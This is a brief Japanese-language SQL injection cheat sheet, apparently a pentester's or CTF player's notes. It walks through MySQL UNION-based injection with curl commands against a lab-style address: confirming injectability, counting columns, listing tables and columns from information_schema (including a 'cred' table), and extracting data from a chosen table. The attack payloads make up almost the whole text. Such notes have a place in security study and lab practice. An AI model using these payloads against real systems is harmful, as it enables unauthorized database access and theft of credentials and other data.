# SQL Injection

## 参考 (MySQL)

- https://dev.mysql.com/doc/refman/8.0/en/information-schema-columns-table.html
- https://dev.mysql.com/doc/refman/8.0/en/information-schema-tables-table.html

## SQLi の手順

1. SQLi が可能か確認

```zsh
curl "http://10.10.10.10/index.php?q='+OR+1--+-"
```

2. 列数の確認

```zsh
curl "http://10.10.10.10/index.php?q='+ORDER+BY+3--+-"
(error)

curl "http://10.10.10.10/index.php?q='+ORDER+BY+2--+-"
(no error)
```

3. 各列の表示位置の確認

```zsh
curl "http://10.10.10.10/index.php?q='+UNION+ALL+SELECT+1,2--+-"
```

4. 表名の確認

```zsh
curl "http://10.10.10.10/index.php?q='+UNION+ALL+SELECT+table_name,NULL+FROM+information_schema.tables+WHERE+table_schema!='mysql'+AND+table_schema!='information_schema'+AND+table_schema!='performance_schema'+AND+table_schema!='sys'--+-"
```

5. 列名の確認

```zsh
curl "http://10.10.10.10/index.php?q='+UNION+ALL+SELECT+column_name,NULL+FROM+information_schema.columns+WHERE+table_name='cred'--+-"
```

6. 狙った表から情報を搾取

```zsh
curl "http://10.10.10.10/index.php?q='+UNION+ALL+SELECT+a_col,NULL+FROM+a_table--+-"
```
